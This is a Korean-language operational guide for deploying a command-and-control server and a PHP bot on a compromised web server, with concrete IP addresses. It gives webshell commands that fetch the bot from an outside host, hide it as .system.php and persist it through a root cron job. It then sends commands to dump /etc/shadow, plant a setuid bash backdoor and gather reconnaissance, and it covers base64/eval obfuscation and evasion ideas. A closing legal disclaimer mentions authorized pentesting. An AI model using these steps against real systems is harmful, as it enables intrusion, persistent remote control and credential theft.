# C2 서버 배포 가이드

## 🎯 서버 구성

- **C2 서버:** 57.181.28.7 (명령 관리 서버)
- **오퍼레이터:** 52.192.8.114 (관리자 접속)
- **타겟(봇):** 52.78.221.104 (감염된 서버)

---

## 📋 1단계: C2 서버 설치 (57.181.28.7)

### 1.1 SSH 접속
```bash
ssh ec2-user@57.181.28.7
```

### 1.2 필요한 패키지 설치
```bash
sudo yum update -y
sudo yum install python3 python3-pip -y
pip3 install flask
```

### 1.3 C2 서버 업로드
```bash
# 로컬에서 C2 서버 전송
scp fin/c2/simple_c2_server.py ec2-user@57.181.28.7:~/
```

### 1.4 C2 서버 실행
```bash
# 57.181.28.7에서 실행
cd ~
python3 simple_c2_server.py
```

**또는 백그라운드 실행:**
```bash
nohup python3 simple_c2_server.py > c2.log 2>&1 &
```

### 1.5 방화벽 설정 (AWS 보안 그룹)
- **포트 8080 열기**
  - Type: Custom TCP
  - Port: 8080
  - Source:
    - 52.192.8.114/32 (오퍼레이터만 접속)
    - 52.78.221.104/32 (타겟 봇 접속)

---

## 📋 2단계: 봇 배포 (52.78.221.104)

### 2.1 C2 봇 파일 수정
로컬 PC에서 `c2_bot.php` 파일 수정:
```php
$C2_SERVER = 'http://57.181.28.7:8080';  // C2 서버 주소
```

### 2.2 봇 업로드
```bash
# 방법 1: 웹쉘로 직접 업로드
curl -s "http://52.78.221.104/uploads/x.php?x=/var/www/html/www/uploads/rootbash%20-p%20-c%20'wget%20https://your-server.com/c2_bot.php%20-O%20/var/www/html/www/.system.php'"

# 방법 2: SSH로 업로드 (그레이박스)
scp -i ~/.ssh/id_rsa c2_bot.php ec2-user@52.78.221.104:/tmp/
ssh -i ~/.ssh/id_rsa ec2-user@52.78.221.104 "sudo cp /tmp/c2_bot.php /var/www/html/www/.system.php"
```

### 2.3 Cron으로 자동 실행 설정
```bash
# 웹쉘로 Cron 추가 (1분마다 실행)
curl -s "http://52.78.221.104/uploads/x.php?x=/var/www/html/www/uploads/rootbash%20-p%20-c%20'echo%20%22*%20*%20*%20*%20*%20php%20/var/www/html/www/.system.php%22%20%3E%20/etc/cron.d/c2bot'"

# 또는 SSH로
ssh -i ~/.ssh/id_rsa ec2-user@52.78.221.104
sudo bash -c 'echo "* * * * * root php /var/www/html/www/.system.php" > /etc/cron.d/c2bot'
```

---

## 📋 3단계: 오퍼레이터 사용 (52.192.8.114 또는 로컬 PC)

### 3.1 웹 인터페이스 접속
```bash
# 브라우저에서:
http://57.181.28.7:8080/

# 또는 SSH 터널로 안전하게:
ssh -L 8080:localhost:8080 ec2-user@57.181.28.7
# 브라우저: http://localhost:8080/
```

### 3.2 봇 목록 확인
```bash
curl http://57.181.28.7:8080/bots | python3 -m json.tool
```

**결과 예시:**
```json
[
  {
    "bot_id": "a1b2c3d4e5f6...",
    "ip_address": "52.78.221.104",
    "hostname": "ip-172-31-40-109",
    "os_info": "Linux ip-172-31-40-109...",
    "first_seen": "2025-11-10 20:10:00",
    "last_seen": "2025-11-10 20:15:00"
  }
]
```

### 3.3 명령 전송
```bash
# BOT_ID는 /bots에서 확인
BOT_ID="a1b2c3d4e5f6..."

# 명령 전송
curl -X POST http://57.181.28.7:8080/send_command \
  -H "Content-Type: application/json" \
  -d "{\"bot_id\": \"$BOT_ID\", \"command\": \"whoami\"}"
```

### 3.4 결과 확인 (1분 후)
```bash
curl http://57.181.28.7:8080/get_results/$BOT_ID | python3 -m json.tool
```

**결과 예시:**
```json
[
  {
    "command_id": 1,
    "command": "whoami",
    "result": "root\n",
    "received_at": "2025-11-10 20:16:00"
  }
]
```

---

## 🎮 사용 예시

### 예시 1: 시스템 정보 수집
```bash
# 명령 전송
curl -X POST http://57.181.28.7:8080/send_command \
  -H "Content-Type: application/json" \
  -d '{"bot_id": "BOT_ID", "command": "uname -a && cat /etc/os-release"}'

# 1분 후 결과 확인
curl http://57.181.28.7:8080/get_results/BOT_ID
```

### 예시 2: 파일 다운로드
```bash
# 명령 전송
curl -X POST http://57.181.28.7:8080/send_command \
  -H "Content-Type: application/json" \
  -d '{"bot_id": "BOT_ID", "command": "cat /etc/shadow | base64"}'

# 결과에서 base64 디코딩
curl http://57.181.28.7:8080/get_results/BOT_ID | jq -r '.[0].result' | base64 -d
```

### 예시 3: 백도어 추가 배포
```bash
# 명령 전송
curl -X POST http://57.181.28.7:8080/send_command \
  -H "Content-Type: application/json" \
  -d '{"bot_id": "BOT_ID", "command": "cp /bin/bash /tmp/.hidden && chmod 4755 /tmp/.hidden"}'
```

### 예시 4: 네트워크 정보
```bash
curl -X POST http://57.181.28.7:8080/send_command \
  -H "Content-Type: application/json" \
  -d '{"bot_id": "BOT_ID", "command": "ip a && netstat -tunlp"}'
```

---

## 🔧 고급 설정

### Systemd 서비스로 C2 서버 자동 실행

57.181.28.7에서:
```bash
sudo tee /etc/systemd/system/c2-server.service > /dev/null <<'EOF'
[Unit]
Description=C2 Server
After=network.target

[Service]
Type=simple
User=ec2-user
WorkingDirectory=/home/ec2-user
ExecStart=/usr/bin/python3 /home/ec2-user/simple_c2_server.py
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
sudo systemctl enable c2-server
sudo systemctl start c2-server
sudo systemctl status c2-server
```

### 로그 확인
```bash
# C2 서버 로그
tail -f ~/c2.log

# 봇 cron 로그
ssh ec2-user@52.78.221.104
sudo tail -f /var/log/cron
```

---

## 🔐 보안 고려사항

### 1. 인증 추가
C2 서버에 API 키 인증 추가:
```python
# simple_c2_server.py에 추가
API_KEY = 'your_secret_key_here'

@app.before_request
def check_auth():
    if request.endpoint not in ['index']:  # 웹 인터페이스 제외
        key = request.headers.get('X-API-Key')
        if key != API_KEY:
            return jsonify({'error': 'Unauthorized'}), 401
```

### 2. HTTPS 사용
```bash
# SSL 인증서 생성 (자체 서명)
openssl req -x509 -newkey rsa:4096 -nodes -out cert.pem -keyout key.pem -days 365

# Flask에서 HTTPS 사용
app.run(host='0.0.0.0', port=8443, ssl_context=('cert.pem', 'key.pem'))
```

### 3. 난독화
봇 파일 난독화:
```bash
# PHP 난독화 도구 사용 또는
# Base64 인코딩
base64 c2_bot.php > c2_bot_encoded.txt

# 실행 시 디코딩
php -r "eval(base64_decode(file_get_contents('c2_bot_encoded.txt')));"
```

---

## 📊 웹 인터페이스 기능

### 자동 새로고침
- 봇 목록: 10초마다 자동 갱신
- 활성/비활성 봇 표시 (Last seen)

### 주요 기능
1. **봇 관리**
   - 전체 봇 목록 조회
   - 각 봇의 상태 모니터링

2. **명령 전송**
   - 특정 봇에 명령 전송
   - 명령 큐 관리

3. **결과 조회**
   - 실행 결과 실시간 확인
   - 히스토리 조회 (최근 50개)

---

## 🚨 트러블슈팅

### 봇이 체크인하지 않음
```bash
# 1. Cron 확인
ssh ec2-user@52.78.221.104
sudo cat /etc/cron.d/c2bot

# 2. 수동 실행 테스트
sudo php /var/www/html/www/.system.php

# 3. C2 서버 접속 테스트
curl http://57.181.28.7:8080/bots
```

### C2 서버 응답 없음
```bash
# 1. 서버 상태 확인
ssh ec2-user@57.181.28.7
ps aux | grep python3

# 2. 포트 확인
netstat -tunlp | grep 8080

# 3. 방화벽 확인 (AWS 보안 그룹)
```

### 명령이 실행되지 않음
```bash
# 1. 명령 큐 확인
sqlite3 c2_database.db "SELECT * FROM commands WHERE status='pending';"

# 2. 봇 로그 확인
ssh ec2-user@52.78.221.104
sudo tail -f /var/log/httpd/error_log
```

---

## 📈 확장 아이디어

1. **다중 C2 서버**
   - 여러 C2 서버로 분산
   - 하나가 다운되어도 다른 서버 사용

2. **DNS 터널링**
   - HTTP 대신 DNS 쿼리로 통신
   - 더 은밀한 통신

3. **암호화 통신**
   - AES로 명령/결과 암호화
   - 네트워크 감시 회피

4. **파일 업로드/다운로드**
   - 봇에서 파일 수집
   - C2에서 도구 배포

---

## ⚠️ 법적 경고

이 C2 시스템은 **오직** 다음 목적으로만 사용:
- ✅ 승인된 침투 테스트
- ✅ 자신의 인프라 관리
- ✅ 교육/연구 목적

불법 사용 시:
- 🚫 정보통신망법 위반
- 🚫 컴퓨터범죄
- 🚫 최대 10년 징역

**반드시 합법적으로 사용하세요!**
